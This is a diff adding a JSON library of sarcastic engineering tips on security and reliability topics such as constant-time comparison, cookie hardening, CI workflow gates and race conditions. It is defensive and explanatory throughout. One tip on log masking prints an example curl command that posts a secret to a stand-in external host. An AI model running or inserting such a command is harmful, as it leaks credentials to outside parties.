@@ -1,0 +1,125 @@
+{
+  "_comment": "Cynthia's personal engineering tips library — witty, sarcastic, generalized so any of these apply to any codebase, not just whatever project they were first learned on. Local only, not tied to any repo. Add to this over time; port a tip into a project's own README rotation only if that project wants one.",
+  "tips": [
+    {
+      "id": "antipattern",
+      "title": "What even IS an antipattern",
+      "text": "🚩 A pattern is a recognized way of solving a problem. An antipattern is a recognized way of solving a problem that's known to blow up in your face — recognized specifically because enough people already tried it and got burned that it earned a name. Calling something an antipattern isn't 'this is untested.' It's 'this exact mistake has a reputation.'"
+    },
+    {
+      "id": "constant-time-compare",
+      "title": "Why == is a snitch",
+      "text": "⏱️ Plain equality checks stop comparing the second they hit a mismatch — which means a wrong guess returns measurably faster the earlier it goes wrong. Given enough patience, that timing difference can be read like a signal, one character at a time. Constant-time comparison refuses to be that easy to read: same time, every time, win or lose. Anywhere you're comparing a secret to user input, this matters."
+    },
+    {
+      "id": "network-none",
+      "title": "The strongest boundary is the one that isn't there to cross",
+      "text": "📡 A firewall rule tells something not to call anyone. No network interface at all means it CAN'T — there's no cable to plug into, no rule needed to enforce. When something genuinely has no legitimate reason to reach the network, don't restrict it — remove the capability entirely. The strongest boundary is the one that was never built."
+    },
+    {
+      "id": "resource-limits",
+      "title": "Numbers are sometimes the whole defense",
+      "text": "💣 A runaway process (a fork bomb, a memory leak, an infinite loop) doesn't care how clever your code is — it just wants resources, forever. A hard cap on memory, CPU, or process count turns 'take down the whole machine' into 'hit a wall almost immediately.' Sometimes the best defense against a whole category of bug is just... a number."
+    },
+    {
+      "id": "goroutine-leak",
+      "title": "The Zoom call nobody left",
+      "text": "😴 Any background worker with a timeout needs a SECOND way to know it's done, not just 'the timer will eventually fire' — because if the work already finished normally, that timer might never fire again, and the worker sits there forever holding onto memory it doesn't need. This is called a leak, and it is the software equivalent of a Zoom call still running because nobody hit 'Leave.'"
+    },
+    {
+      "id": "escape-by-default",
+      "title": "Trust issues, but for input",
+      "text": "🛡️ Any content that didn't originate from your own code — user input, another team's data, anything typed by someone other than you — should be treated as hostile by default, escaped first, with only specific, deliberate exceptions let back in through a narrow door. This is the correct amount of trust to extend to content you don't fully control: basically none, with receipts."
+    },
+    {
+      "id": "cookie-hardening",
+      "title": "A cookie with boundaries",
+      "text": "🍪 HttpOnly (JavaScript can't touch it, not even through an XSS payload), Secure (HTTPS only, no plaintext gossiping), SameSite (doesn't just go wherever it's invited). Any cookie carrying something sensitive should have all three. This cookie has more personal boundaries than most people."
+    },
+    {
+      "id": "rate-limit-key",
+      "title": "Nice try, cookie rotation",
+      "text": "🔁 Rate-limiting by a value the CLIENT controls (a cookie, a header) means the client can just... change that value and get a brand new limit. Anything used as a rate-limit key needs to include something the requester can't casually rotate — an IP, an authenticated identity — or the limit isn't actually limiting anything."
+    },
+    {
+      "id": "root-equivalent-access",
+      "title": "The one ring problem",
+      "text": "💍 Any interface that lets one system fully control another (a socket, an API key, an admin token) is, functionally, root access to whatever it controls — one ring to rule the thing. Using that kind of access deliberately, with zero unvalidated user input anywhere near it, is a reasonable engineering decision. Using it casually, 'just to make this easier,' is how cautionary tales get written."
+    },
+    {
+      "id": "delete-the-feature",
+      "title": "The best fix is deleting the thing that needed fixing",
+      "text": "↩️ Sometimes the right fix for a vulnerability isn't a patch — it's removing the mechanism that created the vulnerability in the first place. If a feature's whole design creates an attack surface, ask whether the feature actually needs to work that way before you spend more effort defending it."
+    },
+    {
+      "id": "race-conditions",
+      "title": "The bug that only happens when nobody's looking",
+      "text": "🎭 Two independent tasks writing to the same thing at the exact same instant is a race condition — the software version of two people scribbling on the same line of the same page simultaneously. It doesn't happen every time, which is what makes it dangerous: it shows up as 'sometimes it just breaks, can't reproduce it' — the single scariest sentence in any bug report. Go's race detector (-race) catches it on the spot by watching every task's memory access as the program actually runs. Not every language ships a tool this good for this exact problem — if yours does, use it as a habit, not just after something's already gone wrong."
+    },
+    {
+      "id": "blast-radius-of-unhandled-errors",
+      "title": "One bad clone can take the whole show down",
+      "text": "💥 When a program runs several things at once and one of them hits a problem nobody told it how to handle, plenty of languages/runtimes don't quietly kill just that one thing — they kill the entire program, for every single task it was running, at whatever unpredictable moment that one thing went wrong. A bug in one small corner of a system can mean a total outage, not a partial one. Worth asking, for anything that runs in parallel: if this one piece fails, what actually happens to everything else running alongside it?"
+    },
+    {
+      "id": "secrets-write-only",
+      "title": "The vault that eats the key",
+      "text": "🔒 A saved secret, once set, cannot be read back by anyone — not you, not an admin, not the platform's own support staff. The only way a secret ever leaks is a workflow/script that was explicitly told to print it or send it somewhere. If a secret got out, something was built to let it out — it didn't just 'get read.'"
+    },
+    {
+      "id": "masking-is-cosmetic",
+      "title": "The redacted log lied to you, gently",
+      "text": "🙈 Log masking hides a secret's value wherever it would print in the log VIEWER. It does absolutely nothing to a network request the same step sends out. `curl -d \"key=$SECRET\" https://elsewhere` leaks the real value the instant it fires — the log showing `***` afterward is not evidence the secret stayed home."
+    },
+    {
+      "id": "codeowners-or-not-and",
+      "title": "CODEOWNERS math is OR, not AND",
+      "text": "➗ Listing three people on one CODEOWNERS line reads like 'all three must approve.' It means any ONE of them satisfies the rule. If you actually want unanimous review, that's a different, more deliberate setup — don't assume the comma is doing more work than it is. And remember to list the CODEOWNERS file itself as one of its own protected paths, or the rule can edit itself out."
+    },
+    {
+      "id": "workflow-dispatch-side-door",
+      "title": "The front door you forgot you installed",
+      "text": "🚪 Branch protection and required reviewers guard the act of MERGING. workflow_dispatch doesn't merge anything — it just runs a workflow directly, on any branch, for anyone with write access, with zero review in between. If that workflow can ship something real, it needs its own gate (a GitHub Environment with required reviewers), because your merge-time protections were never watching that door."
+    },
+    {
+      "id": "runner-label-not-secret",
+      "title": "Your runner's name tag is showing",
+      "text": "🏷️ A self-hosted runner's label lives in plain text in the workflow file that targets it. It is not a secret, a password, or an access control — anyone who can read the workflow can read the label. What actually limits who can use that runner is restricting its Runner Group to specific repos, not hoping nobody notices the label."
+    },
+    {
+      "id": "lucky-vs-protected",
+      "title": "Lucky and protected are different words",
+      "text": "🍀 A thing that didn't happen isn't automatically proof your defense worked — sometimes it just didn't happen for an unrelated reason (a billing limit, a coincidence, a typo on the attacker's end) that would not have saved you the next time. Before crediting a decision for an outcome, check whether the decision was actually load-bearing."
+    },
+    {
+      "id": "visibility-toggle-wipes-protection",
+      "title": "Flipping the sign doesn't just hide the store, it fires the security guard",
+      "text": "🚨 Switching a repo from private to public and back is not a harmless, reversible toggle — on at least one platform, doing this wipes classic branch protection rules entirely, and switching back does NOT restore them. If you must flip visibility for any reason, test the round-trip on one throwaway case first, don't assume settings survive a trip."
+    },
+    {
+      "id": "verify-the-convenient-conclusion",
+      "title": "The easy explanation is the one to double-check hardest",
+      "text": "🔍 'Surely it's the same thing everywhere,' 'that one's fine, it already failed,' 'we're protected because X' — the conclusions that require zero extra work to believe are exactly the ones most worth checking directly, because convenient and correct are only sometimes the same thing."
+    },
+    {
+      "id": "shell-hostile-password",
+      "title": "Your password and your shell had a fight, and you lost",
+      "text": "🐚💀 Put $#! in a password that ever passes through a plain KEY=value file, and the universe reads it as three separate insults: $ goes looking for a variable to become, # silently deletes everything after it as a 'comment,' and ! starts rifling through shell history for something to yell back. None of this throws an error — it just quietly stores a different password than the one you typed, forever, until you go insane debugging a login that 'should definitely work.' Letters, digits, and -_.,  only, for anything living in a file like this — save the profanity-shaped passwords for somewhere that can actually appreciate them."
+    },
+    {
+      "id": "nil-no-error-still-a-problem",
+      "title": "The receipt that says everything's fine for an empty bag",
+      "text": "🧾 A function handing back (nothing, no error) is a real, legal return value in plenty of languages — and it's the one combination most callers never think to guard against, because they're only checking 'did this fail?' not 'did this actually give me something?' No error doesn't mean you got a result. It might just mean nobody told you it came back empty. Check for the absence of a valid result, not just the presence of an error — a crash two lines later on 'nothing.field' is this bug wearing a trench coat."
+    },
+    {
+      "id": "limit-one-no-order-by",
+      "title": "LIMIT 1 without ORDER BY is the database saying 'surprise me'",
+      "text": "🎲 A query that can only ever match one row doesn't need an ORDER BY. The moment your schema allows a SECOND row to legitimately match the same lookup, that same query quietly stops being deterministic — nothing errors, nothing warns you, it just becomes a coin flip which row comes back, and the flip can land differently run to run. If more than one row can ever share a lookup key, LIMIT 1 needs an ORDER BY riding shotgun, or you're not querying anymore — you're gambling with extra steps."
+    },
+    {
+      "id": "wrong-region-looks-like-not-found",
+      "title": "Same error, different continent",
+      "text": "🌍 Some platforms host your account's data in a specific region — and hitting the WRONG regional endpoint usually doesn't fail loudly with 'wrong region.' It just returns a generic 'not found,' because the request never reached a server that has ever heard of your account. Before concluding a resource is missing or a token is dead, check you actually knocked on the right regional door — from the outside, 'wrong address' and 'genuinely doesn't exist' look identical."
+    }
+  ]
+}
